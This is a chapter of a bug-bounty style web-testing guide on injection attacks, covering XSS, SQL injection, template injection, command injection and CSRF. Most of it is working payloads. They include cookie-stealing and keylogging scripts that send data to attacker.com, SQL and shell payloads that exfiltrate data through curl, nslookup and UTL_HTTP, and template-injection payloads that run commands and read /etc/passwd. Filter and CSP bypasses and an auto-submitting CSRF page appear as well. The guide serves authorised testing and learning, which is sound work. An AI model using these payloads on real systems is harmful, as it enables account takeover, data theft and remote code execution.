---
title: "Part 4: Injection Classes"
nav_order: 5
layout: default
---

## PART 4: INJECTION CLASSES
*Status: COMPLETE — Iteration 4 (Parts A + B)*

> **The mindset:** Injection happens when user-controlled data is interpreted
> as code or commands in a context where it shouldn't be. Every place the
> application takes input and does something with it is a potential injection
> point. The question is always: *what context does this input land in,
> and what characters control that context?*

---

### 4.1 Cross-Site Scripting (XSS)

**What XSS is:**
User-supplied input is rendered in a browser context without proper encoding,
allowing an attacker to execute arbitrary JavaScript in the victim's browser.
Impact ranges from cookie theft and session hijacking to full account takeover,
keylogging, and phishing under the trusted domain.

**The three types have different sources, sinks, and testing approaches.**

---

#### 4.1.1 Reflected XSS

🔍 **What it is:**
The payload is in the request (URL parameter, form field) and is immediately
reflected back in the response without storage. Requires the victim to visit
a crafted URL.

**Finding it:**
```bash
# Step 1: Identify reflection points
# Browse the app and note every place input appears in the response
# Search bar, error messages, profile fields, URL parameters

# Step 2: Probe for reflection with a unique canary string
# Use a string that's easy to find but won't break anything:
canary="xsstest12345"
# Submit it everywhere, search responses for it

# Step 3: Check the context the canary lands in
# Different contexts need different payloads:
```

**The five HTML contexts and what they need:**

| Context | Example | Breaking Character | Payload Start |
|---------|---------|-------------------|---------------|
| HTML body | `<div>INPUT</div>` | `<` | `<script>` or `<img src=x onerror=...>` |
| HTML attribute (quoted) | `<input value="INPUT">` | `"` | `"><script>` |
| HTML attribute (unquoted) | `<input value=INPUT>` | space or `>` | `onmouseover=alert(1)` |
| JavaScript string | `var x = "INPUT";` | `"` or `'` | `"-alert(1)-"` |
| JavaScript string (template) | `` var x = `INPUT`; `` | `` ` `` | `` `${alert(1)}` `` |
| URL attribute | `<a href="INPUT">` | javascript: | `javascript:alert(1)` |

**Starter payloads — test in order:**
```javascript
// Basic — works if no filtering:
<script>alert(1)</script>

// Attribute break:
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
" onmouseover="alert(1)

// JS string context:
";alert(1)//
'-alert(1)-'
\'-alert(1)//

// Without parentheses (filter bypass):
<img src=x onerror=alert`1`>
<script>onerror=alert;throw 1</script>

// Without script tag:
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>

// Encoded variants:
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<script>\u0061lert(1)</script>

// Case variation:
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=X ONERROR=alert(1)>
```

🛠️ **Tools:**
```bash
# Dalfox — fast, accurate XSS scanner
dalfox url "https://target.com/search?q=FUZZ" \
  --skip-bav \
  --output dalfox_results.txt

# With authentication:
dalfox url "https://target.com/search?q=FUZZ" \
  --cookie "session=<token>" \
  --output dalfox_results.txt

# Pipe from parameter list:
cat params.txt | dalfox pipe --cookie "session=<token>"

# XSStrike — intelligent, tries to bypass filters:
python3 xsstrike.py -u "https://target.com/search?q=test" \
  --crawl --blind

# kxss — fast inline scanner for reflected params:
cat urls.txt | kxss
```

⚠️ **Gotchas:**
- `alert(1)` is blocked by many modern apps. Use `alert(document.domain)` instead —
  it proves domain context and is harder to false-positive.
- CSP may block inline scripts. See 4.1.7 for CSP bypass.
- Always confirm XSS executes in a real browser — curl output is not enough.

---

#### 4.1.2 Stored XSS

🔍 **What it is:**
The payload is stored in the database and rendered whenever the page is viewed —
by any user, including admins. Impact is higher than reflected because:
- No victim interaction beyond visiting the page
- Admin users often view stored content → admin cookie theft → privilege escalation
- Persistent — fires every time the content is loaded

**High-value injection points:**
```
User profile fields: name, bio, location, website URL
Comments and reviews
File names (uploaded file, then viewed in file browser)
Support ticket content (viewed by support/admin)
Message/chat content
Notification text
Address fields
Company name / organization fields
Any field that appears in an admin dashboard
```

**Testing stored XSS:**
```
1. Identify every input field the app stores
2. Inject a canary string in each: xsstest<>"'
3. Find where this value is rendered (own profile page, admin view, other users' view)
4. Check if characters are encoded in the rendered output
5. If < > are rendered as < > → HTML-encoded → harder to exploit
6. If rendered raw → inject XSS payload

Blind XSS — when you don't see where the input renders:
- Your payload may fire in an admin panel, email client, or logging system
- Use a payload that phones home when it executes:
  <script src="https://xsshunter.trufflesecurity.com/yourpayload.js"></script>
  OR
  <script>new Image().src="https://interactsh.server/"+document.cookie</script>
```

🛠️ **XSS Hunter (blind XSS):**
```
1. Register at xsshunter.trufflesecurity.com (free)
2. Get your unique payload URL
3. Inject in every stored field: <script src="https://your.xsshunter.io/abc.js"></script>
4. XSS Hunter captures: cookie, DOM, screenshot, URL where it fired
5. Check your dashboard — if payload fires in admin panel → admin XSS
```

---

#### 4.1.3 DOM XSS

🔍 **What it is:**
The vulnerability lives entirely in client-side JavaScript. The server never
sees the payload — it goes from a **source** (where attacker input enters JS)
to a **sink** (where JS interprets it as code/HTML).

**Common sources (where attacker input enters):**
```javascript
document.URL
document.location
document.location.href
document.location.search    // ?param=value
document.location.hash      // #fragment
document.referrer
window.name
document.cookie
localStorage / sessionStorage
```

**Common sinks (where execution happens):**
```javascript
// HTML sinks:
element.innerHTML = SOURCE          // classic DOM XSS
element.outerHTML = SOURCE
document.write(SOURCE)
document.writeln(SOURCE)

// URL sinks:
location.href = SOURCE              // open redirect + XSS
location.replace(SOURCE)
location.assign(SOURCE)
element.src = SOURCE
element.action = SOURCE

// Execution sinks:
eval(SOURCE)
setTimeout(SOURCE, 0)
setInterval(SOURCE, 0)
Function(SOURCE)()
```

**Finding DOM XSS:**
```bash
# Step 1: Search JS files for dangerous sinks:
grep -rn "innerHTML\|outerHTML\|document.write\|eval(" ./js_files/

# Step 2: Trace what feeds into the sink:
# Find: element.innerHTML = someVar
# Trace: where does someVar come from?
# Is it from document.location.search? → test with URL param

# Step 3: Check URL hash specifically — many apps read fragments:
# https://target.com/page#<img src=x onerror=alert(1)>

# Step 4: DOM Invader (Burp built-in):
# Open Burp's embedded browser
# Enable DOM Invader in extension settings
# Browse the app — it automatically identifies sources and sinks
# Reports DOM XSS candidates with canary injection
```

**Manual test for hash-based DOM XSS:**
```
https://target.com/page#<img src=x onerror=alert(document.domain)>
https://target.com/page#"><script>alert(1)</script>
https://target.com/search#q=<svg onload=alert(1)>
```

📚 **References:**
- [PortSwigger DOM XSS labs](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)

---

#### 4.1.4 Blind XSS

→ Covered in 4.1.2 (Stored XSS section). Key tool: XSS Hunter.
The distinction: blind XSS fires in a context you can't directly observe
(admin panel, logging system, email client, PDF generator).

**Additional payload variants for blind XSS:**
```javascript
// Fetch-based exfil (bypasses some CSPs):
<script>
fetch('https://interactsh.server/?c='+document.cookie)
</script>

// Image-based (no script tag needed):
<img src=x onerror="this.src='https://interactsh.server/?c='+document.cookie">

// In input field names (fires when admin views form submissions):
<input name='"><script src="https://xsshunter.io/abc.js"></script>'>

// SVG (bypasses some HTML filters):
<svg><script>alert(document.domain)</script></svg>
```

---

#### 4.1.5 XSS Filter Bypass Techniques

🔍 **When basic payloads are blocked — systematic bypass approach:**

```javascript
// 1. Case variation:
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=X ONERROR=alert(1)>

// 2. Broken/malformed tags (some parsers still execute):
<scr<script>ipt>alert(1)</scr</script>ipt>
<<script>alert(1)</script>

// 3. No parentheses:
<img src=x onerror=alert`1`>
<script>onerror=alert;throw 1</script>
<script>{onerror=alert}throw 1</script>

// 4. No spaces:
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>

// 5. Encoding (HTML entities):
<img src=x onerror=&#97;lert(1)>
<img src=x onerror=&#x61;lert(1)>

// 6. JavaScript encoding:
<script>\u0061lert(1)</script>
<script>\x61lert(1)</script>

// 7. Event handler variety (when onerror/onload blocked):
<body onpageshow=alert(1)>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<select autofocus onfocus=alert(1)>
<input autofocus onfocus=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>

// 8. Polyglot (works in multiple contexts):
javascript:"/*'/*`/*--></noscript></title></textarea></style></template>
</noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>

// 9. Double encoding (if server decodes twice):
%253Cscript%253Ealert(1)%253C/script%253E

// 10. Comment bypass:
<script>al/**/ert(1)</script>
<script>al//ert(1)
ert(1)</script>
```

📚 **References:**
- [PortSwigger XSS cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
  — the most comprehensive XSS payload reference, filterable by context and browser.
  **Bookmark this. Use it every time basic payloads fail.**

---

#### 4.1.6 XSS to Account Takeover

🔍 **Escalating XSS beyond alert(1):**

**Cookie theft (session hijacking):**
```javascript
// Exfil session cookie to your server:
document.location='https://attacker.com/steal?c='+document.cookie

// Fetch-based (no redirect, stealthier):
fetch('https://interactsh.server/steal?c='+encodeURIComponent(document.cookie))

// Note: HttpOnly cookies cannot be stolen via JS. Use XSS for other attacks
// when HttpOnly is set.
```

**CSRF via XSS (when HttpOnly blocks cookie theft):**
```javascript
// Perform actions on behalf of the victim:
fetch('/api/users/me', {
  method: 'PUT',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'}),
  credentials: 'include'  // sends victim's cookies automatically
})
// Then trigger password reset to attacker email → ATO
```

**OAuth token theft:**
```javascript
// If OAuth token is in localStorage (not HttpOnly):
fetch('https://attacker.com/?t='+localStorage.getItem('access_token'))
```

**Keylogger:**
```javascript
document.addEventListener('keypress', function(e){
  fetch('https://attacker.com/keys?k='+e.key)
})
```

---

#### 4.1.7 CSP Bypass Approaches

🔍 **When Content-Security-Policy blocks your XSS:**
```bash
# Step 1: Read the CSP header:
curl -sv https://target.com/ 2>&1 | grep -i "content-security-policy"

# Step 2: Analyze with CSP Evaluator:
# https://csp-evaluator.withgoogle.com/
# Paste the policy → it highlights weaknesses
```

**Common CSP weaknesses:**

| Weakness | Bypass |
|---------|--------|
| `unsafe-inline` present | Inline scripts allowed → basic XSS works |
| `unsafe-eval` present | `eval()` allowed → JS string execution |
| Whitelisted CDN with user content | Upload JS to CDN, load from there |
| `*.google.com` in script-src | JSONP endpoints on Google can execute JS |
| Wildcard subdomain `*.target.com` | Find XSS on any subdomain |
| `data:` allowed in script-src | `<script src="data:text/javascript,alert(1)">` |
| Nonce reuse | If nonce is static (not per-request), reuse it |
| `object-src` not set | `<object data="javascript:alert(1)">` |

**JSONP bypass (when trusted domain has JSONP endpoint):**
```javascript
// If CSP allows scripts from accounts.google.com:
// Find a JSONP endpoint there: accounts.google.com/o/oauth2/revoke?callback=alert
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)//"></script>
```

📚 **References:**
- [PortSwigger CSP bypass](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [PortSwigger XSS labs (all types)](https://portswigger.net/web-security/cross-site-scripting)

---

#### 4.1.8 XSS Testing Checklist

```
□ Every input field — inject canary string, find where it reflects
□ URL parameters — all of them, not just the obvious ones
□ URL hash (#fragment) — DOM XSS source
□ HTTP headers that get reflected (User-Agent, Referer, custom headers)
□ File names on upload
□ Error messages — do they reflect input?
□ JSON responses rendered in HTML — is JSON properly encoded?
□ Check rendering context (HTML body, attribute, JS string, URL)
□ Run Dalfox on all parameterized URLs
□ Run DOM Invader while manually browsing
□ Install XSS Hunter payload in all stored fields
□ Check CSP header — analyze for bypasses
□ If XSS found: escalate to ATO (cookie theft, CSRF, token theft)
```

---

### 4.2 SQL Injection

**What SQLi is:**
User input is incorporated into a SQL query without proper parameterization.
The attacker closes the intended query structure and injects their own SQL.
Modern ORMs have reduced SQLi frequency but it remains common in:
- Legacy codebases
- Search/filter functionality built with raw queries
- APIs that accept complex filter parameters
- Raw SQL in stored procedures

---

#### 4.2.1 Detection — Finding the Injection Point

🔍 **Probe every input with these first:**
```
# Single quote — breaks string context:
'
''
`
')
'))
')-- -
' OR '1'='1

# Other delimiters:
"
")
"))
")-- -

# Numeric context (no quotes needed):
1 AND 1=1
1 AND 1=2
1 ORDER BY 1-- -
1 ORDER BY 100-- -   (if error → column count exceeded)

# Blind canary — no error but behavior changes:
' AND '1'='1    (true condition — same results)
' AND '1'='2    (false condition — empty/different results)
```

**Signs of a vulnerable parameter:**
```
→ Database error message (MySQL, MSSQL, OracleDB syntax visible)
→ Blank/empty response when you expect data (false condition)
→ Different response size for true vs false condition
→ Application error / 500 response
→ Time delay (for time-based blind)
```

**Where to look:**
```
Search fields, filter parameters
Login forms (username/password)
Order/sort parameters: ?sort=name&order=asc
ID parameters: ?id=1
Category filters: ?category=electronics
Date ranges: ?from=2026-01-01
Any parameter that appears to query a database
HTTP headers: User-Agent, X-Forwarded-For, Referer (stored in DB logs)
Cookies containing IDs or session data
```

---

#### 4.2.2 Error-Based SQLi

🔍 **When the database returns errors you can read:**
```sql
-- MySQL error extraction:
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)-- -

-- PostgreSQL:
' AND 1=CAST((SELECT version()) AS INT)-- -

-- MSSQL:
' AND 1=CONVERT(INT,(SELECT @@version))-- -
' AND 1=1/0-- -  (divide by zero error reveals info)

-- Oracle:
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -
```

**Identify the database first:**
```sql
-- MySQL:     ' AND SLEEP(1)-- -  or version() contains "MySQL"
-- PostgreSQL: ' AND pg_sleep(1)-- -  or SELECT version() mentions "PostgreSQL"
-- MSSQL:     ' WAITFOR DELAY '0:0:1'-- -  or @@version
-- Oracle:    ' AND 1=1 FROM DUAL-- -  (requires FROM clause)
-- SQLite:    ' AND sqlite_version()-- -
```

---

#### 4.2.3 Blind Boolean-Based SQLi

🔍 **When no error is visible but behavior changes on true/false:**
```sql
-- True condition (same response as normal):
' AND 1=1-- -
' AND 'a'='a'-- -

-- False condition (different/empty response):
' AND 1=2-- -
' AND 'a'='b'-- -

-- Extract data character by character:
-- Is the first character of the database name 'a'?
' AND SUBSTRING(database(),1,1)='a'-- -
' AND ASCII(SUBSTRING(database(),1,1))>97-- -  (binary search)
' AND ASCII(SUBSTRING(database(),1,1))=109-- -  (exact match)

-- Automate with sqlmap once injection confirmed:
sqlmap -u "https://target.com/items?id=1" \
  --technique=B \
  --level=2 \
  --batch \
  --dbs
```

---

#### 4.2.4 Time-Based Blind SQLi

🔍 **When there's no visible difference in response — use time delay:**
```sql
-- MySQL:
' AND SLEEP(5)-- -
' AND IF(1=1,SLEEP(5),0)-- -
' AND IF(SUBSTRING(database(),1,1)='t',SLEEP(5),0)-- -

-- PostgreSQL:
'; SELECT pg_sleep(5)-- -
' AND 1=(SELECT 1 FROM pg_sleep(5))-- -

-- MSSQL:
'; WAITFOR DELAY '0:0:5'-- -
' IF(1=1) WAITFOR DELAY '0:0:5'-- -

-- Oracle:
' AND 1=1 AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'-- -
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- - (MySQL in subquery)
```

**Time-based confirmation:**
```bash
# Measure response time:
time curl -s "https://target.com/search?q=test' AND SLEEP(5)-- -"
# real  5.032s → 5 second delay confirmed → vulnerable
```

---

#### 4.2.5 Out-of-Band SQLi (DNS Exfiltration)

🔍 **When blind/time-based is unreliable — use DNS callback:**
```sql
-- MySQL (requires FILE privilege):
' AND LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\abc'))-- -

-- MSSQL (most reliable OOB):
'; EXEC master..xp_dirtree '\\attacker.com\share'-- -
'; EXEC master..xp_cmdshell 'nslookup attacker.com'-- -

-- Oracle:
' AND (SELECT UTL_HTTP.request('http://attacker.com/'||
  (SELECT banner FROM v$version WHERE rownum=1)) FROM dual) IS NOT NULL-- -

-- PostgreSQL:
'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/?v='||version()-- -
```

**OOB callback server:**
```bash
# Use interactsh:
interactsh-client -server interactsh.com
# Get your unique URL: abc123.interactsh.com
# Inject into SQLi payload, watch for DNS/HTTP callback
```

---

#### 4.2.6 Responsible sqlmap Usage on Live Targets

🔍 **sqlmap is powerful but noisy. Use it carefully:**
```bash
# Basic detection — least invasive:
sqlmap -u "https://target.com/search?q=test" \
  --level=1 \
  --risk=1 \
  --batch \
  --technique=BEUST \   # Boolean, Error, Union, Stacked, Time
  --output-dir=./sqlmap_output

# With authentication:
sqlmap -u "https://target.com/search?q=test" \
  --cookie="session=<token>" \
  --level=2 \
  --batch

# POST request (save request from Burp first):
sqlmap -r request.txt \
  --level=2 \
  --batch

# Dump specific data (after confirming injection):
sqlmap -u "https://target.com/search?q=test" \
  --dbs                    # list databases
sqlmap -u "..." -D target_db --tables    # list tables
sqlmap -u "..." -D target_db -T users --dump  # dump table

# Throttle to avoid hammering:
sqlmap -u "..." --delay=2 --timeout=10 --retries=1
```

**sqlmap on live programs — rules:**
```
✓ Always use --level=1 --risk=1 first
✓ Throttle with --delay=2 minimum
✓ Never use --os-shell or --os-cmd on live programs
✓ Never use --file-write or --file-read on live programs
✓ Once injection is confirmed — stop sqlmap, report manually
✗ Do not dump the entire database — capture 2-3 rows as PoC, stop
✗ Never run sqlmap on endpoints not explicitly in scope
```

---

#### 4.2.7 Second-Order SQLi

🔍 **What it is:**
The payload is stored safely (escaped) on input, but when retrieved and used
in a subsequent query (without re-sanitization), injection occurs.

**Classic example:**
```
Registration: username = admin'-- -
→ Stored safely (escaped) in DB

Password change query uses stored username:
UPDATE users SET password='newpass' WHERE username='admin'-- -'
→ The ' closes the string, -- - comments out the rest
→ Changes admin's password instead of yours
```

**Testing for second-order:**
```
1. Register/create with: admin'-- -  or  test' AND '1'='1
2. Use the application normally (don't trigger injection at registration)
3. Perform actions that use the stored value in a new query:
   - Change password
   - Update profile
   - Search using stored preferences
   - Export data using stored settings
4. Look for: changed behavior, errors, wrong data returned
```

---

#### 4.2.8 SQLi in Non-Standard Locations

🔍 **Beyond URL parameters:**
```bash
# HTTP headers (often logged to DB):
# Test these headers in any request:
X-Forwarded-For: 1' AND SLEEP(3)-- -
User-Agent: Mozilla' AND SLEEP(3)-- -
Referer: https://target.com/' AND SLEEP(3)-- -
X-Custom-Header: test' AND SLEEP(3)-- -

# JSON body:
{"search": "test' AND SLEEP(3)-- -"}
{"filter": {"name": "test' AND 1=1-- -"}}
{"ids": [1,2,"3 AND SLEEP(3)-- -"]}

# XML body (SOAP endpoints):
<search>test' AND SLEEP(3)-- -</search>

# Cookie values:
Cookie: user_pref=electronics' AND SLEEP(3)-- -

# Order/sort parameters (often injected directly into ORDER BY):
GET /api/items?sort=name' AND SLEEP(3)-- -
# Note: ORDER BY cannot use parameterized queries in most DBs
# → frequent injection point even in well-coded apps
```

---

#### 4.2.9 SQLi Testing Checklist

```
DETECTION
□ Single quote in every parameter → error or behavior change?
□ True/false conditions → different response size?
□ SLEEP() in every parameter → time delay?
□ Check non-standard locations: headers, cookies, JSON body, ORDER BY

IDENTIFICATION
□ Identify database type (MySQL, Postgres, MSSQL, Oracle)
□ Identify injection type (error, boolean blind, time blind, OOB)

EXPLOITATION (PoC only — minimal footprint)
□ Confirm with sqlmap at level=1/risk=1
□ Extract: database version, current user, database name
□ Extract: one sample row from users table (no full dumps)
□ If OOB: confirm DNS callback with interactsh

SPECIAL CASES
□ Second-order: register with SQL payload, test operations that use stored value
□ HTTP headers: test User-Agent, X-Forwarded-For, Referer
□ ORDER BY / GROUP BY parameters (cannot use prepared statements)
□ JSON/XML body parameters
```

📚 **Part 4A References:**
- [PortSwigger XSS labs](https://portswigger.net/web-security/cross-site-scripting)
- [PortSwigger SQL injection labs](https://portswigger.net/web-security/sql-injection)
- [PortSwigger XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [sqlmap documentation](https://sqlmap.org)
- [Dalfox](https://github.com/hahwul/dalfox)
- [PayloadsAllTheThings — XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [PayloadsAllTheThings — SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

### 4.3 Server-Side Template Injection (SSTI)

**What it is:**
Template engines (Jinja2, Twig, FreeMarker, etc.) let developers embed expressions
like `{{user.name}}` in HTML. If user input is passed directly into the template
string rather than as a variable value, the attacker can inject template expressions
that execute on the server — often leading to full RCE.

---

#### 4.3.1 Detection — Polyglot and Math Probes

🔍 **The detection approach:**
Different engines use different syntax. Inject probes that trigger evaluation
across multiple engines simultaneously. A response containing `49` where you
sent `{{7*7}}` confirms SSTI.

**Polyglot probe (try this first):**
```
{{7*7}}${7*7}#{7*7}<%= 7*7 %>{{7*'7'}}
```
Send as input to any field that appears rendered in the response.
If the response contains `49`, `7777777`, or similar — SSTI confirmed.

**Targeted math probes by engine syntax:**
```
{{7*7}}          → Jinja2, Twig, Pebble (expect 49)
${7*7}           → FreeMarker, Velocity, Thymeleaf (expect 49)
<%= 7*7 %>       → ERB (Ruby), EJS (Node)
#{7*7}           → Ruby (some engines)
{{7*'7'}}        → Jinja2 returns 7777777 / Twig returns 49 (differentiates them)
${{7*7}}         → Jinja2 in certain config
{7*7}            → Smarty
@(7*7)           → Razor (.NET)
```

**Where to probe:**
```
URL parameters:        ?name=John{{7*7}}
Profile fields:        Display name, bio, email templates
Search fields:         Any field rendered back to page
File names:            Upload a file named {{7*7}}.txt
Error messages:        Paths that get reflected in errors
Email templates:       Name fields used in welcome/notification emails
Feedback forms:        Any text rendered server-side
```

---

#### 4.3.2 Engine Identification

🔍 **After confirming injection, identify the engine:**

```
                Input: {{7*7}}
                      ↓
           Response contains 49?
          YES ↙              ↘ NO
    Input: {{7*'7'}}      Try: ${7*7}
         ↙       ↘              ↓
  "7777777"    "49"       Response 49?
     ↓            ↓        YES → FreeMarker/Velocity/Thymeleaf
   Jinja2       Twig       NO → Try ERB, Smarty, Razor
```

**Confirming specific engines:**
```python
# Jinja2 (Python):
{{config}}                    # dumps Flask config object
{{self.__class__}}            # reveals Python class
{{request}}                   # Flask request object

# Twig (PHP):
{{_self.env.getExtension}}    # Twig environment
{{dump(app)}}                 # Symfony app object

# FreeMarker (Java):
${.data_model}                # data model
${freemarker.version}         # version string

# Smarty (PHP):
{$smarty.version}             # Smarty version

# ERB (Ruby):
<%= File.open('/etc/passwd').read %>  # direct RCE attempt
```

---

#### 4.3.3 RCE via SSTI

🔍 **Engine-specific RCE payloads:**

**Jinja2 (Python/Flask) — most common in bug bounty:**
```python
# Read /etc/passwd:
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}

# Shorter via __builtins__:
{{[].__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("id").read()')}}

# Via cycler (Flask-specific):
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Via Jinja2 internals (most reliable):
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}
    {{x()._module.__builtins__['__import__']('os').popen('id').read()}}
  {% endif %}
{% endfor %}
```

**Twig (PHP):**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

// Or:
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('passthru')}}
```

**FreeMarker (Java):**
```java
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

// Or:
${"freemarker.template.utility.Execute"?new()("id")}
```

**ERB (Ruby):**
```ruby
<%= `id` %>
<%= system("cat /etc/passwd") %>
<%= IO.popen('id').read %>
```

**Velocity (Java):**
```java
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
```

⚠️ **Gotchas:**
- WAFs often block `__class__`, `__mro__`, `__subclasses__`. Try encoding:
  `__class__` → `__cla\u0073\u0073__` or use `|attr()` filter in Jinja2:
  `()|attr('__class__')|attr('__mro__')`
- Always use OOB (DNS callback via interactsh) to confirm blind SSTI before
  attempting full RCE — confirms execution without risking crashes.

📚 **References:**
- [PortSwigger SSTI labs](https://portswigger.net/web-security/server-side-template-injection)
- [PayloadsAllTheThings — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [SSTImap — automated SSTI exploitation](https://github.com/vladko312/SSTImap)

---

#### 4.3.4 SSTI Testing Checklist
```
□ Inject polyglot probe in every user-controlled field that renders in response
□ Math probe: {{7*7}}, ${7*7}, <%= 7*7 %>
□ Confirm: does 49 appear in response?
□ Identify engine via differentiation probes
□ Blind SSTI: use OOB (DNS via interactsh) before RCE
□ Check sandboxed vs. unsandboxed (some Jinja2 configs are sandboxed)
□ For PoC: show id or hostname command output — stop there, no full shell
```

---

### 4.4 Command Injection

**What it is:**
The application passes user input to an OS shell command without sanitization.
The attacker appends shell operators to inject additional commands.
Impact: Remote Code Execution — typically Critical.

---

#### 4.4.1 Detection Probes

🔍 **Shell command separators — one of these will work on the target OS:**
```bash
# Command chaining operators:
;id
&&id
||id
|id
`id`
$(id)

# With whitespace variations:
; id
&& id
|| id
| id

# Newline separator (sometimes bypasses filters):
%0aid
%0a id

# Full probe set — inject after normal input:
test;id
test&&id
test||id
test|id
test`id`
test$(id)
test%0aid

# If the app runs Windows (rare in web context):
test&whoami
test|whoami
test&&whoami
```

**Blind command injection probes (when output isn't visible):**
```bash
# Time-based (sleep):
; sleep 5
&& sleep 5
| sleep 5
$(sleep 5)
`sleep 5`

# Windows:
& timeout /t 5

# Measure with curl:
time curl -s "https://target.com/api/ping?host=127.0.0.1;sleep+5"
# real  5.1s → 5 second delay → confirmed
```

---

#### 4.4.2 Blind Command Injection — OOB Exfiltration

🔍 **When time-based is unreliable, use DNS callback:**
```bash
# Linux — DNS lookup with data exfiltration:
; nslookup $(whoami).attacker.com
; nslookup `id | cut -d' ' -f1`.attacker.com
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/$(id | base64)

# Using interactsh:
; nslookup $(whoami).abc123.interactsh.com
# Attacker receives DNS query: root.abc123.interactsh.com → confirms root exec

# With data in subdomain:
; host $(cat /etc/passwd | head -1 | base64 | tr -d '\n').abc123.interactsh.com
```

**OOB setup:**
```bash
# Start interactsh client:
interactsh-client -server interactsh.com -token <your_token>
# Gives you: abc123.interactsh.com
# Watch terminal for incoming DNS/HTTP interactions
```

---

#### 4.4.3 Where Command Injection Hides

🔍 **Features that commonly invoke OS commands:**
```
Network utilities:
- Ping/traceroute functionality: host=127.0.0.1;id
- DNS lookup features
- Port checking tools

File operations:
- File conversion (ImageMagick, ffmpeg, LibreOffice)
- Archive creation/extraction
- File name parameters passed to shell

Email features:
- "Send test email" with server hostname
- Mail relay features

System information:
- Server status pages
- Health check endpoints that run shell commands

CI/CD and DevOps features (if in scope):
- Build trigger endpoints
- Deployment hooks

PDF/document generation:
- wkhtmltopdf, Pandoc, LaTeX — all can execute commands
- Header injection in document generator → command injection
```

**ImageMagick (common in image processing):**
```bash
# Upload an image with a malicious filename or metadata:
filename: test.jpg;id;.jpg
# Or create a .svg with embedded command:
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="200px" height="200px" version="1.1"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://example.com/image.jpg`id`" x="0" y="0"
height="200px" width="200px"/>
</svg>
```

📚 **References:**
- [PortSwigger — OS command injection](https://portswigger.net/web-security/os-command-injection)
- [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

---

### 4.5 Cross-Site Request Forgery (CSRF)

**What it is:**
A malicious page causes a victim's browser to send a state-changing request
to a target site where the victim is authenticated. The browser automatically
includes session cookies — the server can't distinguish legitimate requests
from forged ones.

---

#### 4.5.1 Detection — When Is an Endpoint CSRF-Vulnerable?

🔍 **An endpoint is vulnerable when ALL of these are true:**
```
1. It performs a state-changing action (not just reading data)
2. It relies solely on cookies/session for authentication
3. It does NOT have a valid CSRF defense in place
```

**CSRF defenses to check for (if any present → harder to exploit):**
```
CSRF token: A random value in request body/header validated server-side
SameSite cookie: Strict or Lax prevents cross-site cookie sending
Origin/Referer check: Server validates request comes from same origin
Custom header requirement: e.g. X-Requested-With (not sendable cross-origin)
```

**Testing for absent/bypassable CSRF protection:**
```bash
# Check for CSRF token in request:
# → No token in body → no token in headers → likely vulnerable

# If token present — test these bypasses:
# 1. Remove the token entirely:
POST /api/email/change
email=attacker@evil.com
# (no csrf_token parameter at all)

# 2. Use an empty token:
csrf_token=

# 3. Use a random value (same length as real token):
csrf_token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

# 4. Use your own token for victim's request:
# Get a valid CSRF token from your own session
# Use it in a request with the victim's session cookie
# If it works → token not tied to session
```

---

#### 4.5.2 PoC Construction

🔍 **HTML form-based CSRF PoC:**
```html
<!-- Save as csrf_poc.html, host on any server, send link to victim -->
<html>
<body>
  <h1>CSRF PoC</h1>
  <form id="csrfForm" action="https://target.com/api/user/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
    <input type="hidden" name="confirm_email" value="attacker@evil.com" />
  </form>
  <script>
    // Auto-submit on page load:
    document.getElementById('csrfForm').submit();
  </script>
</body>
</html>
```

**For GET-based state changes (rare but exists):**
```html
<img src="https://target.com/api/logout" style="display:none">
